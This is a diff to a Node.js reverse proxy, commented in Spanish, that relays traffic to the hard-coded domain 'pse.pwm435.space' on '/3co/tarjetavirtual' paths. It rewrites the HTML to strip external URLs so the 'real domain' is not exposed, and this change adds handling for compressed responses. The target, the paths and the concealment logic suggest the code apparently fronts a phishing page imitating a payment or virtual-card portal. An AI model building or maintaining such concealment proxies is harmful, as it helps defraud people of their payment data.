@@ -15,7 +15,7 @@ const PORT = process.env.PORT || 3000;
 const TARGET_URL = process.env.TARGET_URL || 'https://pse.pwm435.space';
 const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];
 
-// Derivar host del TARGET_URL para la lista blanca
+// Derivar host del TARGET_URL para la lista blanca de dominios
 let TARGET_HOST = '';
 try {
   TARGET_HOST = new URL(TARGET_URL).host;
@@ -36,21 +36,24 @@ app.use((req, res, next) => {
   next();
 });
 
-// ---- Utilidades de descompresión (por si Cloudflare/origen envían comprimido) ----
-const decompressIfNeeded = async (buffer, encoding) => {
-  if (!encoding) return buffer;
+// ---- Utilidades de descompresión (si upstream envía comprimido) ----
+const decompressIfSupported = async (buffer, encoding) => {
+  if (!encoding) return { buffer, supported: true };
   const enc = String(encoding).toLowerCase();
+
   try {
-    if (enc.includes('gzip')) return await gunzip(buffer);
-    if (enc.includes('br')) return await brotliDecompress(buffer);
+    if (enc.includes('gzip')) return { buffer: await gunzip(buffer), supported: true };
+    if (enc.includes('br'))   return { buffer: await brotliDecompress(buffer), supported: true };
     if (enc.includes('deflate')) {
-      try { return await inflate(buffer); } catch { return await inflateRaw(buffer); }
+      try { return { buffer: await inflate(buffer), supported: true }; }
+      catch { return { buffer: await inflateRaw(buffer), supported: true }; }
     }
+    // zstd u otros: no soportado por Node estándar
+    return { buffer, supported: false };
   } catch {
-    // Si falla, devolvemos el buffer tal cual para no romper la respuesta.
-    return buffer;
+    // Si falla la descompresión, lo tratamos como no soportado
+    return { buffer, supported: false };
   }
-  return buffer;
 };
 
 // ---- Ofuscación de contenido HTML (no romper recursos propios/Cloudflare) ----
@@ -70,8 +73,8 @@ const obfuscateContent = (contentString, contentType) => {
 
   // Reemplazar referencias absolutas a dominios externos, excepto lista blanca
   let modified = contentString.replace(/https?:\/\/([^\/\s"']+)/g, (match, host) => {
+    if (!host) return '';
     if (allowedDomains.some(d => host.includes(d))) return match;
-    // elimina la URL externa para evitar exponer dominio real u otros
     return '';
   });
 
@@ -138,7 +141,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// ---- Configuración del proxy (SIN compresión) ----
+// ---- Configuración del proxy ----
 const proxyOptions = {
   target: TARGET_URL,
   changeOrigin: true,
@@ -164,8 +167,8 @@ const proxyOptions = {
     }
     proxyReq.setHeader('Accept-Language', req.get('Accept-Language') || 'es-ES,es;q=0.9,en;q=0.8');
 
-    // Pedir SIEMPRE sin compresión al upstream
-    proxyReq.removeHeader('Accept-Encoding');
+    // Pedir explícitamente SIN compresión al upstream (evita zstd/gzip/br)
+    proxyReq.setHeader('Accept-Encoding', 'identity');
 
     // Indicar al backend que el cliente original usó HTTPS (útil con Cloudflare Flexible/redirects)
     proxyReq.setHeader('X-Forwarded-Proto', 'https');
@@ -186,28 +189,38 @@ const proxyOptions = {
     proxyRes.headers['X-XSS-Protection'] = '1; mode=block';
     proxyRes.headers['Referrer-Policy'] = 'no-referrer';
     proxyRes.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private';
-    // OJO: no borrar aquí 'content-encoding'; lo gestionamos en el interceptor SOLO para HTML.
   },
 
-  // Interceptor del cuerpo (solo HTML). Si llega comprimido, descomprime → modifica → entrega SIN compresión.
+  // Interceptor del cuerpo:
+  // - No-HTML: passthrough
+  // - HTML + gzip/deflate/br: descomprime -> modifica -> sirve SIN compresión
+  // - HTML + zstd/otro no soportado: passthrough (mantener content-encoding)
   on: {
     proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
       const contentType = proxyRes.headers['content-type'] || '';
+      const isHtml = String(contentType).includes('text/html');
 
-      // Solo tocamos HTML. Otros tipos se devuelven tal cual (incluida su compresión/headers)
-      if (!String(contentType).includes('text/html')) {
+      if (!isHtml) {
+        // No tocamos nada (incluida compresión o longitudes)
         return responseBuffer;
       }
 
-      // Si por alguna razón llegó comprimido (p. ej. Cloudflare), descomprimir
-      const contentEncoding = proxyRes.headers['content-encoding']; // br/gzip/deflate
-      const decompressed = await decompressIfNeeded(responseBuffer, contentEncoding);
+      const contentEncoding = proxyRes.headers['content-encoding']; // puede ser gzip/deflate/br/zstd
 
-      // Modificar HTML
-      const htmlString = decompressed.toString('utf8');
+      // Intentar descomprimir si es un encoding soportado
+      const { buffer: maybeDecompressed, supported } = await decompressIfSupported(responseBuffer, contentEncoding);
+
+      if (!supported && contentEncoding) {
+        // Encoding NO soportado (ej. zstd): no modificar y mantener headers
+        // Devolvemos tal cual, para que el navegador decodifique correctamente
+        return responseBuffer;
+      }
+
+      // Ya tenemos HTML descomprimido (o nunca estuvo comprimido)
+      const htmlString = maybeDecompressed.toString('utf8');
       const modifiedBuffer = obfuscateContent(htmlString, contentType);
 
-      // Vamos a servir el HTML SIN compresión al cliente:
+      // Entregamos SIN compresión al cliente
       delete proxyRes.headers['content-encoding'];
       proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBuffer);
 
